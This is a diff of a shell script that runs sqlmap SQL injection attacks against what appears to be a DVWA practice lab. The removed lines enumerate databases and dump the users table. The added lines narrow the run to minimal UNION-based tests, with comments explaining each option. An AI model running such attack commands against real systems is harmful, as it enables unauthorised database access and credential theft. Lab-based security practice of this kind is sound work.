@@ -91,21 +91,28 @@ echo ""
 echo "[*] Starting sqlmap..."
 echo "============================================================"
 
-# sqlmap command - attack the 'id' parameter
+# sqlmap command - LIMITED to ~20 requests
+# Use --test-filter to only run specific tests
 sqlmap -u "${TARGET_URL}?id=1&Submit=Submit" \
     --cookie="PHPSESSID=$PHPSESSID; security=$SECURITY_LEVEL" \
     --batch \
-    --banner \
-    --current-user \
-    --current-db \
-    --dbs \
-    --tables -D dvwa \
-    --dump -D dvwa -T users \
-    --technique=BEUSTQ \
-    --level=3 \
-    --risk=2 \
+    --technique=U \
+    --level=1 \
+    --risk=1 \
+    --test-filter="UNION" \
+    --skip-waf \
+    --no-cast \
     --random-agent \
-    --output-dir="$(dirname "$0")/sqlmap_output"
+    --output-dir="$(dirname "$0")/sqlmap_output" \
+    --flush-session
+
+# Options explained:
+#   --technique=U     : Only UNION-based (fastest)
+#   --level=1         : Minimal tests
+#   --risk=1          : Minimal payloads
+#   --test-filter     : Only run tests matching "UNION"
+#   --no-cast         : Skip CAST/CONVERT tests
+#   --skip-waf        : Skip WAF detection
 
 echo ""
 echo "============================================================"
